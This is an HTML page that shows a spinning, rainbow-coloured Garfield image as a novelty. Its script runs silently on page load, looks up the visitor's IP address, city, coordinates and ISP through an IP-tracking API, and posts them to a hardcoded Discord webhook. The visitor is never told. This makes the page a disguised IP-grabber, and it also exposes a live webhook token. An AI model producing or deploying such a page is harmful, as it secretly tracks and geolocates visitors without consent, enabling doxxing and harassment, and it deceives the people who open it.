<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Rainbow Garfield</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      background-color: black;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    #garfield {
      width: 150px; /* Adjust size as needed */
      height: auto;
      animation: spin 2s linear infinite, rainbow 3s linear infinite;
    }

    /* Spin animation */
    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }

    /* Rainbow effect */
    @keyframes rainbow {
      0% {
        filter: hue-rotate(0deg);
      }
      100% {
        filter: hue-rotate(360deg);
      }
    }
  </style>
</head>
<body>
  <!-- Garfield Image -->
  <img id="garfield" src="https://i.imgur.com/garfield.png" alt="Garfield">

  <script>
    // Discord webhook URL (replace with your own)
    const webhookUrl = 'https://canary.discord.com/api/webhooks/1346563589908992123/PM9ke2tdThuaF4xTVfniODgo8CK7szjhBtULjFizSJyFLf88cuZzHlBEwD9EDN3396cS';

    // Send a message to the Discord webhook with the full IP info
    async function sendToDiscord(ipData) {
      const message = {
        content: `Someone visited the Rainbow Garfield page! üêæ Here is the detailed info of their IP:
        IP Address: ${ipData.ip}
        Country: ${ipData.country}
        Region: ${ipData.region}
        City: ${ipData.city}
        Latitude: ${ipData.latitude}
        Longitude: ${ipData.longitude}
        ISP: ${ipData.isp}`,
      };

      try {
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(message),
        });
        
        if (response.ok) {
          console.log(`It worked: ${ipData.ip}`);
        } else {
          console.error('Error sending message to Discord:', response.statusText);
        }
      } catch (error) {
        console.error('Error sending message to Discord:', error);
      }
    }

    // Get the user's IP and detailed info using the Trace IP API
    async function getVisitorIP() {
      try {
        // Using the Trace IP API to get full details
        const response = await fetch('https://www.ip-tracker.org/ip-tracker-api.php?json=1');
        const data = await response.json();

        if (data.status === "success") {
          // Log the IP and detailed info
          console.log('IP details:', data);
          sendToDiscord(data);
        } else {
          console.error('Failed to retrieve IP details:', data.message);
        }
      } catch (error) {
        console.error('Error getting IP details:', error);
      }
    }

    // Send the message when the page loads
    getVisitorIP();
  </script>
</body>
</html>
